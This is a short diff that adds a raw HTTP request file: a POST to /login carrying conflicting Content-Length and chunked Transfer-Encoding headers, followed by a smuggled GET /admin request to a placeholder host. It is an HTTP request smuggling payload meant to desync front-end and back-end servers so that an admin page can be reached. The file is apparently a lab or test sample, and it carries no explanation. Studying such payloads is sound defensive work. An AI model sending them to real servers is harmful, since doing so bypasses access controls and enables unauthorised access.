@@ -1,0 +1,12 @@
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: bar
